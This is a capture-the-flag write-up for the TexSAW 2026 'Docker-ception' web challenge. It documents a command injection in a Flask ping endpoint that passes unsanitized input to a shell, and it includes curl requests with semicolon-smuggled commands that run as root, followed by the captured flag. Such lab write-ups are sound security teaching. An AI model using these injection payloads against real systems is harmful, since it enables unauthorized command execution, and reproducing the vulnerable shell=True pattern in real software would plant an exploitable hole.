---
title: "TexSAW 2026: Docker-ception"
description: "Writeup for Docker-ception from TexSAW 2026. Challenge weight: 100 points."
slug: texsaw-docker-ception
date: 2026-03-27 20:18:36.453+0000
competition: "TexSAW 2026"
categories:
    - Web Exploitation
tags:
    - writeup
    - texsaw-2026
    - docker-ception
---

## Challenge

- Competition: [TexSAW 2026](https://ctf.txs3c.com/)
- Challenge: `Docker-ception`
- Category: `Web Exploitation`
- Points: `100`


## Solve Path

FLAG:
texsaw{4N_1dE4_12_L1Ke_a_V1Ru2_r351l1eN7_h19HlY_c0n74910u2}

WRITEUP:
1) Target Overview
URL / endpoint: `https://tex1.watthewat.me/`, `POST /ping`
Tech stack (if known): `openresty` in front of a Flask/Python app
Observed behavior: the homepage posts a single `host` parameter to `/ping` and renders raw command output inside `<pre>`

2) Recon
Directory discovery: `/robots.txt`, `/admin`, `/api`, `/debug`, and `/.git/HEAD` returned 404; `/` exposed the only useful flow
Parameters found: `host`
Cookies / sessions: none observed
Headers: `Server: openresty`, `X-Served-By: tex1.watthewat.me`
JS analysis: inline JS does `fetch('/ping', { method: 'POST', body: 'host=' + encodeURIComponent(host) })`
Hidden endpoints: none confirmed beyond `/ping`
Source review: reading `/app/app.py` via injection showed:
`subprocess.check_output(f"sudo -u ctfer ping -c 1 {host}", shell=True, ...)`

3) Vulnerability
Type: Command injection
Root cause: unsanitized `host` is interpolated into a shell command with `shell=True`
Proof of vulnerability:
```bash
curl -k -X POST https://tex1.watthewat.me/ping \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1;id'
```
Observed output included: `uid=0(root) gid=0(root) groups=0(root)`

4) Exploitation
Step-by-step HTTP requests:
```bash
curl -k https://tex1.watthewat.me/
curl -k -X POST https://tex1.watthewat.me/ping \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1;id'
curl -k -X POST https://tex1.watthewat.me/ping \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1;cat /tmp/flag_output.txt'
```
Payloads used: `127.0.0.1;id`, `127.0.0.1;cat /tmp/flag_output.txt`
Why it works: `;` terminates the intended `ping` command and executes attacker-controlled shell commands. On the current instance, the readable file `/tmp/flag_output.txt` contains the flag. Observation: Docker artifacts exist (`docker`, `dockerd`, `/run/docker.sock`, `ctfer` in `docker` group), but the socket was returning connection refused during verification.

5) Flag Extraction
Exact request that returns the flag:
```bash
curl -k -X POST https://tex1.watthewat.me/ping \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1;cat /tmp/flag_output.txt'
```
Response proof:
`texsaw{4N_1dE4_12_L1Ke_a_V1Ru2_r351l1eN7_h19HlY_c0n74910u2}`
